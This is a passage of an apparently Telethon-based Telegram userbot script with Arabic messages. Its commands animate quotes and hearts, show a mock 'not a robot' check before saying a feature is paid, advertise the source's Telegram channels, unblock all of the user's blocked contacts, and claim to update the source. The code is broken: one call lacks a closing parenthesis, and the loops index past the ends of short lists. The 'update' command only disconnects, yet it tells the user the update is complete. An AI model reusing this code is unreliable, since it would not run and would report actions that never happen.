    animation_chars = [هَو مخِتلف ، و ﭑنا ﭑحبٰ ﭑخِتلافهَ 🫶🏻🥹♥.", "عليًِ هوَ طريقُ الحقِ، فَ من أراد الحقَ فلَ يتبعَه🫂🤎.", "في بعض الاحيان يجب عليك ان تخسرهم حتى تجد نفسك","كم بكينا لاننا لم نبلغ شمساً ولاقمراً ، ثم وضع الله مجرةً باكملها بين ايدينا","الإنسان المتاح للجميع مُقرف.","مالاترضاه لنفسك لاتؤذي به غيرك","ضَجيج العائله هو هدوء القلب","الليل شبعني سفر وآنه بمكاني","انتِ البحر وانا المُبحر بكِ و الغريق.","النوم فرصة للانسان كَي يرتاح من نفسه","تَخيل ان تؤذي شخصاً كان هدفه الوحيد ان يجعلك سعيدا","لا اُفيدَ ولا اعتذِر ولا اُبادر ولا انتظِر .","فَإِنِّي إِذا ضَاقَتْ عَلَيَّ مشَاعِرِي ، ‏كَتَمْتُ ٱلهَوَى لكَنَّ دَمْعِيٌّ تَكَلَّمَا","لن يدومَ الهمُّ يا حلوَ المُحيّا ، ‏لن يظلّ الحزنُ في عينيكَ يحيا","ولو أني أحمد الله دهراً ، ‏ما وفيته جزءاً من النعم","هذهِ العيون الساحراتُ أريدُها فأنا العليلُ وكُحْلها تِرياقي","فلا يغريني مدح ولا يسقطني انتقاد جميعهم اراء وانا القرار","اقاتلُ كلّ جبارِ عنيدِ و يقتلني الفراقُ بلا قتْال","وكيفَ أمحوكَ من أوراقِ ذاكرَتي و أنتَ في القلبِ مثلَ النقشِ في الحجرِ.","اقاتلً لمن اهوُاه ومن اهَواه يقتًلنيٍ","فَيَ اُلهًادئيٓنَ اشياء لاَ تهٍداَ","يكادً حسنًك أنً يغًوي ملائكةًً فمًا بالك بابن الطيًن والماءٍ","‌‏أَنَّ الزَمانَ الَّذي مازالَ يُضحِكُنا ، ‏أُنساً بِقُربِهِمُ قَد عادَ يُبكينا","ومِن جَاهلٍ بي وهوَ يَجهَلُ جَهلَهُ ويَجهَلُ عِلمي أنَّهُ بي جاهِلُ"]

for i in animation_ttl:
        await asyncio.sleep(animation_interval)
        await event.edit(animation_chars[i % 17]
        
            
                    
@sedthon.on(events.NewMessage(outgoing=True, pattern=r"\.قلوب"))
async def _(event):
    event = await event.edit("حسناً")
    animation_interval = 0.2
    animation_ttl = range(96)
    await event.edit("يتم ..")
    animation_chars = [
        "❤️",
        "❤️🖤",
        "❤️🖤💜",
        "❤️🖤💜🧡",
        "❤️🖤💜🧡💛",
        "❤️🖤💜🧡💛💚",
        "❤️🖤💜🧡💛💚💙",
        "❤️🖤💜🧡💛💚",
        "❤️🖤💜🧡💛",
        "❤️🖤💜🧡",
        "❤️🖤💜",
        "❤️🖤",
        "💓"
    ]
    for i in animation_ttl:
        await asyncio.sleep(animation_interval)
        await event.edit(animation_chars[i % 17])

@sedthon.on(events.NewMessage(outgoing=True, pattern=r"\.سيشن"))
async def _(event):
    event = await event.edit("حسناً")
    animation_interval = 0.2
    animation_ttl = range(96)
    await event.edit("يتم ..")
    animation_chars = [
        "انتضر قليلا ليتم تحقق من حسابك 💖🏂.",
         "انتضر قليلا  ليتم تحقق من حسابك 💖🏂.",
        "انتضر للتحقق من انك لست روبوت 🤖😢",
        "1🔅",
        "2🔆",
        "3🔅",
        "4🔆",
        "5🔅",
        "6🔆",
        "تم التحقق من انك لست روبوت 🤖✅."
        " هاذا القسم مدفوع  وليس مجاني ولقد اكتشفت انك لم تقم بالاشتراك 😢 للاشتراك تواصل مع مطور السورس @BDAYAT2 ",
    ]
    for i in animation_ttl:
        await asyncio.sleep(animation_interval)
        await event.edit(animation_chars[i % 17])


@sedthon.on(events.NewMessage(outgoing=True, pattern=r"\.رابط السورس"))
async def _(event):
    event = await event.edit("حسناً")
    animation_interval = 0.2
    animation_ttl = range(96)
    await event.edit("يتم ..")
    animation_chars = [
        "انتضر قليلا ليتم تجهيز الكليشه❤️ ",
        "انتضر للتحقق من انك لست روبوت 🤖😢",
        "1🔅",
        "2🔆",
        "3🔅",
        "4🔆",
        "5🔅",
        "6🔆",
        "تم التحقق من انك لست روبوت 🤖✅."
        "خطـوات تنصـيب استاثون او نشر تلقائي مجانـا 🥷  ✺ | اقرء الشروط : https://t.me/bdayat1  ✺ |  عند التنصيب انت تتحمل مسئولية حسابك ومسئولية تنصيب لانتحمل أي مسئولية هذا فقط سورس مجاني نشاركة معكم لاأكثر  ✺ | والان يمكنك الذهاب لتنصيب السورس https://t.me/ibnsHaRaWi ",
    ]
    for i in animation_ttl:
        await asyncio.sleep(animation_interval)
        await event.edit(animation_chars[i % 17])

@sedthon.on(events.NewMessage(outgoing=True, pattern=r"\.فك حظر"))
async def _(event):
    list = await sedthon(functions.contacts.GetBlockedRequest(offset=0, limit=1000000))
    if len(list.blocked) == 0:
        razan = await event.edit(f'ليس لديك اي شخص محظور !')
    else:
        unblocked_count = 1
        for user in list.blocked:
            UnBlock = await sedthon(functions.contacts.UnblockRequest(id=int(user.peer_id.user_id)))
            unblocked_count += 1
            razan = await event.edit(f'جارِ الغاء الحظر : {round((unblocked_count * 100) / len(list.blocked), 2)}%')
        unblocked_count = 1
        razan = await event.edit(f'تم الغاء حظر : {len(list.blocked)}')


@sedthon.on(events.NewMessage(outgoing=True, pattern=r"\.تحديث"))
async def update(event):
    await event.edit("• جارِ تحديث السورس سورس استاثون ..\n• انتضر 1-2 دقيقة ")
    await sedthon.disconnect()
    await sedthon.send_message("me", "`اكتمل تحديث السورس !`")


print("- sedthon Userbot Running ..")
sedthon.run_until_disconnected()